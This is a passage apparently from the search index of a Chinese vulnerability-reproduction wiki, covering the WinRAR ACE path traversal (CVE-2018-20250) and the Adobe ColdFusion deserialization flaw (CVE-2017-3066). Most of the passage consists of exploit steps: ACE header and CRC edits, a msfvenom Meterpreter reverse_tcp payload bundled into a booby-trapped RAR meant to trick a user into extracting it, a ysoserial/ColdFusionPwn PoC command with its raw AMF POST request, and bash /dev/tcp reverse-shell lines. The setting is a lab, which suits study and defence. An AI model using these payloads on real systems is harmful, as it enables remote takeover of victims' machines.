\u4ee5\u4e0b\u662f\u51e0\u79cd\u673a\u5668\u7684\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff0c\u53ef\u4ee5\u770b\u5230\u5728\u4e2a\u4ebaPC\u4e0a\u53d7\u7528\u6237\u540d\u5f71\u54cd\uff0c\u65e0\u6cd5\u731c\u6d4b\u5230\u51c6\u786e\u7684\u8def\u5f84\uff0c\u800c\u670d\u52a1\u5668\u4e0a\u4e00\u822c\u4e0d\u4f1a\u4fee\u6539\u7528\u6237\u540d\uff0c\u6240\u4ee5\u8fd9\u4e2a\u6f0f\u6d1e\u5728\u670d\u52a1\u5668\u4e0a\u5229\u7528\u5ea6\u6bd4\u8f83\u9ad8\u3002 Win2003\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Documents and Settings\\Administrator\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8 Win2008\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win2012\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win7\u3000 \u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Win10\u3000\u5f00\u673a\u542f\u52a8\u9879\u8def\u5f84\uff1aC:\\Users\\\u7528\u6237\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u3000\u3000\u672c\u6b21\u8bd5\u9a8c\u4f7f\u7528\u7684\u662fWin2008\uff0c","title":"\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_5","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_6","text":"\u670d\u52a1\u5668\uff1aWin2008 R2 WinRAR 5.60\u7b80\u4f53\u4e2d\u6587\u7248\uff1a https://www.rarlab.com/rar/winrar-x64-560sc.exe Python-3.7.2-amd64.exe\uff1a https://www.python.org/ftp/python/3.7.2/python-3.7.2-amd64.exe 010Editor\uff1a https://download.sweetscape.com/010EditorWin64Installer901.exe Wace\u548c\u6a21\u677f\u6587\u4ef6\uff1a https://github.com/360-A-Team/CVE-2018-20250 EXP\uff1a https://github.com/WyAtu/CVE-2018-20250","title":"\u73af\u5883\u5de5\u5177\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_7","text":"\u8fd9\u91cc\u6211\u4eec\u5199\u4e00\u4e2abat\uff0c\u8fdb\u884c\u5f39\u7a97\u6f14\u793a\uff1a \u7136\u540e\u6253\u5f00WinAce\uff0c\u9009\u4e2d\u6211\u4eec\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u53f3\u952e\uff0c\u70b9\u51fbAdd to... \u5229\u7528WinACE\u8fdb\u884c\u538b\u7f29,\u8fd9\u91cc\u9009\u62e9store full path\u3002 \u751f\u6210\u4e4b\u540e\u6211\u4eec\u5229\u7528\u811a\u672c\u68c0\u67e5\u4e00\u4e0b\u6211\u4eec\u751f\u6210\u7684\u6587\u4ef61.ace\u7684header\u4fe1\u606f\uff1a \u8fd9\u91cc\u51e0\u4e2a\u662f\u6211\u4eec\u9700\u8981\u4fee\u6539\u7684\u53c2\u6570\u3002 \u5728010Edit\u5de5\u5177\u4e2d\u6253\u5f00\u521a\u624d\u751f\u6210\u76841.ace\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6\u8def\u5f84\u66ff\u6362\u4e3a\u542f\u52a8\u9879\u8def\u5f84\u5982\u4e0b\uff0c\u7136\u540e\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u5b8c\u6574\u7684\u6587\u4ef6\u8def\u5f84\u957f\u5ea6\u4e3a93\uff0c\u8f6c\u6362\u4e3a16\u8fdb\u5236\u540e\u4e3a\uff1a5D\u3002 \u4fee\u6539\u5b8c\u8fd9\u4e24\u4e2a\u5730\u65b9\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\uff0c\u63a5\u7740\u8fd8\u9700\u8981\u4fee\u6539hdr_size\u3002 \u8fd9\u4e09\u4e2a\u5730\u65b9\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u70b9\u51fb\u4fdd\u5b58\u3002 \u6700\u540e\u5229\u7528acefile.py\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002\u4fee\u6539acefile.py\uff0c\u57283061\u884c\u5904\u6dfb\u52a0\u4ee5\u4e0b\u8bed\u53e5\uff0c\u8f93\u51fa\u6587\u4ef6hdr_crc\u3002 print(\"[+] right_hdr_crc : {} | struct {} \".format(hex(ace_crc16(buf)),struct.pack('<H', ace_crc16(buf)))) print(\"[*] current_hdr_crc : {} | struct {}\".format(hex(hcrc),struct.pack('<H', hcrc))) \u53ef\u4ee5\u770b\u5230\u5f53\u524d\u7684hdr_crc\u4e3a\uff1a16 9A\uff0c\u6211\u4eec\u8981\u628a\u5b83\u6539\u4e3aE4 A3\uff0c\u4fdd\u5b58\u4e4b\u540e\u91cd\u65b0\u67e5\u770b\u6587\u4ef6header\u4fe1\u606f\u3002 \u4fee\u6539\u5b8c\u6210\uff0c\u5c06\u6587\u4ef6\u53e6\u5b58\u4e3a1.rar\u3002 \u9009\u62e9\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u6216\u89e3\u538b\u5230\u6587\u4ef6\u59391\u90fd\u53ef\u4ee5\uff0c\u53ef\u4ee5\u770b\u5230bat\u6587\u4ef6\u6210\u529f\u89e3\u538b\u5230\u5f00\u673a\u542f\u52a8\u9879\u91cc\u3002 \u91cd\u542f\u7535\u8111\u67e5\u770b\u6548\u679c\u3002 \u590d\u73b0\u6210\u529f\uff0c\u81ea\u52a8\u8fd0\u884cbat\u6587\u4ef6\u5f39\u7a97\u3002","title":"\u6f0f\u6d1e\u590d\u73b0\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#msf","text":"\u9996\u5148\u4e0b\u8f7dEXP\uff1a wget https://github.com/WyAtu/CVE-2018-20250/archive/master.zip \u8fd9\u91cc\u6211\u89e3\u538b/root/tools\u76ee\u5f55\u4e0b\uff1a \u7136\u540e\u5229\u7528msf\u751f\u6210\u4e00\u4e2a\u6076\u610f\u7a0b\u5e8f\uff0c\u653e\u5230\u8be5\u76ee\u5f55\u4e0b\uff1a msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.86.129 lport=4444 -f exe -o /root/tools/CVE-2018-20250-master/test.exe \u4fee\u6539exp.py\u6587\u4ef6\uff1a \u5c06evil_filename\u6539\u4e3a\u6211\u4eec\u751f\u6210\u7684\u6076\u610f\u7a0b\u5e8f\u3002 \u5c06py -3 \u6539\u4e3apython3\uff0c\u4fee\u6539\u5b8c\u6210\u4e4b\u540e\u4fdd\u5b58\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a python3 exp.py \u6210\u529f\u751f\u6210\u653b\u51fb\u6587\u4ef6test.rar\uff0c\u53ea\u8981\u8bf1\u5bfc\u7528\u6237\u4e0b\u8f7d\u89e3\u538b\u8fd9\u4e2a\u538b\u7f29\u6587\u4ef6\u5462\uff0c\u5c31\u53ef\u5f97\u5230\u7528\u6237\u7535\u8111\u6743\u9650\uff0c\u8fd9\u91cc\u53ea\u6f14\u793a\u529f\u80fd\uff0c\u6211\u4eec\u7528python\u7b80\u5355\u5f00\u542f\u4e00\u4e2ahttp\u670d\u52a1\uff1a python -m SimpleHTTPServer \u5207\u6362\u5230win2008\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u8981\u653b\u51fb\u7684\u76ee\u6807\u673a\u5668\u3002\u4e0b\u8f7dtest.rar\uff0c\u7136\u540e\u76f4\u63a5\u5728\u4e0b\u8f7d\u76ee\u5f55\u89e3\u538b\uff08\u4e5f\u53ef\u9009\u62e9\u5728\u684c\u9762\u89e3\u538b\uff09\u3002 \u53ef\u4ee5\u770b\u5230\u5728\u7cfb\u7edf\u7684\u542f\u52a8\u8def\u5f84\u4e0b\u6210\u529f\u89e3\u538b\u51fahi.exe\u6587\u4ef6\u3002\u63a5\u7740\u6211\u4eec\u5728kali\u4e0a\u9762\u5f00\u542f\u76d1\u542c\uff0c\u7136\u540e\u91cd\u542fwin2008\u3002 \u6210\u529f\u62ff\u5230\u76ee\u6807\u673a\u5668\u6743\u9650\u3002","title":"MSF\u5229\u7528"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/winrar/WinRAR%E7%A9%BF%E9%80%8F%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-20250%EF%BC%89/#_8","text":"\u5220\u9664\u53d7\u5f71\u54cd\u538b\u7f29\u8f6f\u4ef6\u76ee\u5f55\u4e0bUNACEV2.dll\u6587\u4ef6\u80fd\u6709\u6548\u9632\u5fa1\u3002 \u3000\u3000\u5347\u7ea7\u5230\u6700\u65b0\u7248\u672c\uff0cWinRAR \u76ee\u524d\u7248\u672c\u662f 5.70 Beta 1\u3002 \u3000\u3000\u603b\u800c\u8a00\u4e4b\uff0c\u8be5\u6f0f\u6d1e\u5e76\u6ca1\u6709\u90a3\u4e48\u81f4\u547d\u3002\u76ee\u6807\u6027\u7684\u6253\u7ad9\uff0c\u5f97\u5148\u6b3a\u9a97\u4e0b\u8f7d\uff0c\u5e76\u518d\u5728\u672a\u9632\u62a4\u7684\u670d\u52a1\u5668\u4e0a\u89e3\u538b\uff0c\u4f01\u4e1a\u670d\u52a1\u5668\u7ba1\u7406\u5458\u90fd\u5f88\u96be\u4f1a\u8fd9\u6837\u505a\u3002\u800c\u4e14\u5fc5\u987b\u5f97\u670d\u52a1\u5668\u91cd\u542f\u624d\u80fd\u751f\u6548\uff0c\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\u811a\u672c\u3002","title":"\u6f0f\u6d1e\u9632\u5fa1"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/","text":"Adobe ColdFusion \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-3066\uff09 \u00b6 \u6f0f\u6d1e\u539f\u7406 \u00b6 Adobe ColdFusion\u662f\u7f8e\u56fdAdobe\u516c\u53f8\u7684\u4e00\u6b3e\u52a8\u6001Web\u670d\u52a1\u5668\u4ea7\u54c1\uff0c\u5176\u8fd0\u884c\u7684CFML\uff08ColdFusion Markup Language\uff09\u662f\u9488\u5bf9Web\u5e94\u7528\u7684\u4e00\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u3002 Adobe ColdFusion\u4e2d\u5b58\u5728java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6216\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\u4ee5\u4e0b\u7248\u672c\u53d7\u5230\u5f71\u54cd\uff1aAdobe ColdFusion (2016 release) Update 3\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 11 Update 11\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 10 Update 22\u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002 \u53c2\u8003\u94fe\u63a5\uff1a https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html \u590d\u73b0\u6f0f\u6d1e \u00b6 \u542f\u52a8\u73af\u5883 \u00b6 \u8fdb\u5165\u8def\u5f84\u4e3a cd /root/vulhub/coldfusion/CVE-2017-3066 1 \u642d\u5efa\u53ca\u8fd0\u884c\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose build && docker-compose up -d 1 \u6b64\u672c\u5b89\u88c5\u73af\u5883\u9700\u8981\u5927\u69821G+\u7684\u6570\u636e\u4e0b\u8f7d\uff0c\u7f51\u7edc\u4e0d\u597d\u7684\u8d77\u6765\u8d70\u52a8\u8d70\u52a8\u5427:) \u73af\u5883\u542f\u52a8\u6210\u529f\u540e\uff0c\u8bbf\u95ee http://your-ip:8500/CFIDE/administrator/index.cfm \uff0c\u8f93\u5165\u5bc6\u7801 vulhub \uff0c\u5373\u53ef\u6210\u529f\u5b89\u88c5Adobe ColdFusion\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u751f\u6210POC \u00b6 \u4f7f\u7528 ColdFusionPwn \u5de5\u5177\u6765\u751f\u6210POC\u3002 \u4e0b\u8f7dColdFusionPwn \u4e0b\u8f7dysoserial \u3010\u6ce8\u610f\u3011\u4e0b\u8f7d\u7684jar\u5305\u53ef\u80fd\u56e0\u4e3a\u65f6\u95f4\u4e0d\u540c\uff0c\u800c\u66f4\u65b0\uff0c\u5305\u540d\u4e5f\u5c31\u4e0d\u540c\u3002\u6ce8\u610f\u5c06\u547d\u4ee4\u4e2d\u7684\u5305\u540d\uff0c\u66ff\u6362\u4e3a\u4f60\u4e0b\u8f7d\u65f6\u5019\u7684\u540d\u5b57 java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser 1 \u3010\u518d\u6ce8\u610f\u3011\u4e0a\u9762\u7684\u547d\u4ee4\u5728Win10\u4e0b\u6211\u6ca1\u6709\u6267\u884c\u6210\u529f\uff0c\u9519\u8bef\u63d0\u793a\u4e3a \u9519\u8bef: \u627e\u4e0d\u5230\u6216\u65e0\u6cd5\u52a0\u8f7d\u4e3b\u7c7b com.codewhitesec.coldfusionpwn.ColdFusionPwner \u3002\u5728Kali\u6210\u529f\u751f\u6210\u4e86? \u53d1\u9001POC \u00b6 \u751f\u6210poc.ser\u6587\u4ef6\u540e\uff0c\u5c06POC\u4f5c\u4e3a\u6570\u636e\u5305body\u53d1\u9001\u7ed9 http://your-ip:8500/flex2gateway/amf \uff0cContent-Type\u4e3a application/x-amf \uff1a POST /flex2gateway/amf HTTP/1.1 Host: your-ip:8500 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-amf Content-Length: 2853 [...poc...] 1234567891011 \u53d1\u9001POC\u5185\u5bb9 \u00b6 \u7531\u4e8e\u7f16\u7801\u95ee\u9898\uff0c\u5982\u679c\u76f4\u63a5\u4eceNotepad++/Notepad\u91cc\u9762\u590d\u5236\u7c98\u8d34\u4e3abody\u90e8\u5206\uff0c\u662f\u4e0d\u6210\u529f\u7684\uff0c\u5373\u4f7f\u8fd4\u56de\u7684\u72b6\u6001\u7801\u662f200 \u6b63\u786e\u53d1\u9001\u65b9\u5f0f\u4e3a\uff1a \u53f3\u51fb\u9009\u62e9**Paste From File**\uff0c\u4e0a\u4f20**poc.cer**\u6587\u4ef6 \u3010\u611f\u8c22\u8c46\u8001\u5e08?\u7684\u7ea0\u9519\uff0c\u4ee5\u53ca\u79d1\u666e\u7f16\u7801\u95ee\u9898\u3011? \u518d\u5230 Raw \u754c\u9762\u6dfb\u52a0HTTP\u5934\u90e8\uff0c\u5982\u679c\u6210\u529f\uff0c\u5e76\u4e14\u6253\u7b97\u4ee5\u540e\u8fd8\u9700\u8981\u7528\u7684\u8bdd\uff0c\u53f3\u51fb\u9009\u62e9 Copy to File \u4fdd\u5b58 \u68c0\u9a8cPOC \u00b6 \u8fdb\u5165\u5bb9\u5668 \u00b6 \u901a\u8fc7DockerID\u8fdb\u5165\u5bb9\u5668 \u00b6 docker exec -it \u5bb9\u5668ID /bin/bash 1 \u67e5\u770b\u5bb9\u5668ID \u00b6 docker ps 1 \u901a\u8fc7Docker\u540d\u5b57\u8fdb\u5165\u5bb9\u5668 \u00b6 docker-compose exec \u5bb9\u5668\u540d\u5b57 bash 1 \u6bd4\u5982\u672c\u6b21\u73af\u5883\u4e2d\u662f\uff1a docker-compose exec coldfusion bash 1 \u67e5\u770b/tmp/ \u00b6 ls /tmp/ 1 \u53d1\u73b0 /tmp/success \u5df2\u6210\u529f\u521b\u5efa\uff1a \u5c06POC\u6539\u6210 \u53cd\u5f39\u547d\u4ee4 \uff0c\u6210\u529f\u62ff\u5230shell\uff1a \u53cd\u5f39Shell \u00b6 \u683c\u5f0f \u00b6 bash -i >& /dev/tcp/ip/port 0>&1 1 \u4f8b\u5b50 \u00b6 \u6bd4\u5982\u76d1\u542c192.168.236.138\u7684333\u7aef\u53e3 bash -i >& /dev/tcp/192.168.236.138/333 0>&1","title":"Adobe ColdFusion \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE 2017 3066\uff09"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#adobe-coldfusion-cve-2017-3066","text":"","title":"Adobe ColdFusion \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff08CVE-2017-3066\uff09"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_1","text":"Adobe ColdFusion\u662f\u7f8e\u56fdAdobe\u516c\u53f8\u7684\u4e00\u6b3e\u52a8\u6001Web\u670d\u52a1\u5668\u4ea7\u54c1\uff0c\u5176\u8fd0\u884c\u7684CFML\uff08ColdFusion Markup Language\uff09\u662f\u9488\u5bf9Web\u5e94\u7528\u7684\u4e00\u79cd\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u3002 Adobe ColdFusion\u4e2d\u5b58\u5728java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u5e94\u7528\u7a0b\u5e8f\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6216\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\u4ee5\u4e0b\u7248\u672c\u53d7\u5230\u5f71\u54cd\uff1aAdobe ColdFusion (2016 release) Update 3\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 11 Update 11\u53ca\u4e4b\u524d\u7684\u7248\u672c\uff0cColdFusion 10 Update 22\u53ca\u4e4b\u524d\u7684\u7248\u672c\u3002 \u53c2\u8003\u94fe\u63a5\uff1a https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_2","text":"","title":"\u590d\u73b0\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_3","text":"\u8fdb\u5165\u8def\u5f84\u4e3a cd /root/vulhub/coldfusion/CVE-2017-3066 1 \u642d\u5efa\u53ca\u8fd0\u884c\u6f0f\u6d1e\u73af\u5883\uff1a docker-compose build && docker-compose up -d 1 \u6b64\u672c\u5b89\u88c5\u73af\u5883\u9700\u8981\u5927\u69821G+\u7684\u6570\u636e\u4e0b\u8f7d\uff0c\u7f51\u7edc\u4e0d\u597d\u7684\u8d77\u6765\u8d70\u52a8\u8d70\u52a8\u5427:) \u73af\u5883\u542f\u52a8\u6210\u529f\u540e\uff0c\u8bbf\u95ee http://your-ip:8500/CFIDE/administrator/index.cfm \uff0c\u8f93\u5165\u5bc6\u7801 vulhub \uff0c\u5373\u53ef\u6210\u529f\u5b89\u88c5Adobe ColdFusion\u3002","title":"\u542f\u52a8\u73af\u5883"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_4","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc","text":"\u4f7f\u7528 ColdFusionPwn \u5de5\u5177\u6765\u751f\u6210POC\u3002 \u4e0b\u8f7dColdFusionPwn \u4e0b\u8f7dysoserial \u3010\u6ce8\u610f\u3011\u4e0b\u8f7d\u7684jar\u5305\u53ef\u80fd\u56e0\u4e3a\u65f6\u95f4\u4e0d\u540c\uff0c\u800c\u66f4\u65b0\uff0c\u5305\u540d\u4e5f\u5c31\u4e0d\u540c\u3002\u6ce8\u610f\u5c06\u547d\u4ee4\u4e2d\u7684\u5305\u540d\uff0c\u66ff\u6362\u4e3a\u4f60\u4e0b\u8f7d\u65f6\u5019\u7684\u540d\u5b57 java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/CVE-2017-3066_is_success' poc.ser 1 \u3010\u518d\u6ce8\u610f\u3011\u4e0a\u9762\u7684\u547d\u4ee4\u5728Win10\u4e0b\u6211\u6ca1\u6709\u6267\u884c\u6210\u529f\uff0c\u9519\u8bef\u63d0\u793a\u4e3a \u9519\u8bef: \u627e\u4e0d\u5230\u6216\u65e0\u6cd5\u52a0\u8f7d\u4e3b\u7c7b com.codewhitesec.coldfusionpwn.ColdFusionPwner \u3002\u5728Kali\u6210\u529f\u751f\u6210\u4e86?","title":"\u751f\u6210POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_1","text":"\u751f\u6210poc.ser\u6587\u4ef6\u540e\uff0c\u5c06POC\u4f5c\u4e3a\u6570\u636e\u5305body\u53d1\u9001\u7ed9 http://your-ip:8500/flex2gateway/amf \uff0cContent-Type\u4e3a application/x-amf \uff1a POST /flex2gateway/amf HTTP/1.1 Host: your-ip:8500 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-amf Content-Length: 2853 [...poc...] 1234567891011","title":"\u53d1\u9001POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_2","text":"\u7531\u4e8e\u7f16\u7801\u95ee\u9898\uff0c\u5982\u679c\u76f4\u63a5\u4eceNotepad++/Notepad\u91cc\u9762\u590d\u5236\u7c98\u8d34\u4e3abody\u90e8\u5206\uff0c\u662f\u4e0d\u6210\u529f\u7684\uff0c\u5373\u4f7f\u8fd4\u56de\u7684\u72b6\u6001\u7801\u662f200 \u6b63\u786e\u53d1\u9001\u65b9\u5f0f\u4e3a\uff1a \u53f3\u51fb\u9009\u62e9**Paste From File**\uff0c\u4e0a\u4f20**poc.cer**\u6587\u4ef6 \u3010\u611f\u8c22\u8c46\u8001\u5e08?\u7684\u7ea0\u9519\uff0c\u4ee5\u53ca\u79d1\u666e\u7f16\u7801\u95ee\u9898\u3011? \u518d\u5230 Raw \u754c\u9762\u6dfb\u52a0HTTP\u5934\u90e8\uff0c\u5982\u679c\u6210\u529f\uff0c\u5e76\u4e14\u6253\u7b97\u4ee5\u540e\u8fd8\u9700\u8981\u7528\u7684\u8bdd\uff0c\u53f3\u51fb\u9009\u62e9 Copy to File \u4fdd\u5b58","title":"\u53d1\u9001POC\u5185\u5bb9"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#poc_3","text":"","title":"\u68c0\u9a8cPOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_5","text":"","title":"\u8fdb\u5165\u5bb9\u5668"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#dockerid","text":"docker exec -it \u5bb9\u5668ID /bin/bash 1","title":"\u901a\u8fc7DockerID\u8fdb\u5165\u5bb9\u5668"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#id","text":"docker ps 1","title":"\u67e5\u770b\u5bb9\u5668ID"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#docker","text":"docker-compose exec \u5bb9\u5668\u540d\u5b57 bash 1 \u6bd4\u5982\u672c\u6b21\u73af\u5883\u4e2d\u662f\uff1a docker-compose exec coldfusion bash 1","title":"\u901a\u8fc7Docker\u540d\u5b57\u8fdb\u5165\u5bb9\u5668"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#tmp","text":"ls /tmp/ 1 \u53d1\u73b0 /tmp/success \u5df2\u6210\u529f\u521b\u5efa\uff1a \u5c06POC\u6539\u6210 \u53cd\u5f39\u547d\u4ee4 \uff0c\u6210\u529f\u62ff\u5230shell\uff1a","title":"\u67e5\u770b/tmp/"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#shell","text":"","title":"\u53cd\u5f39Shell"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/Adobe/Adobe%20ColdFusion/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/#_6","text":"bash -i >& /dev/tcp/ip/port 0>&1 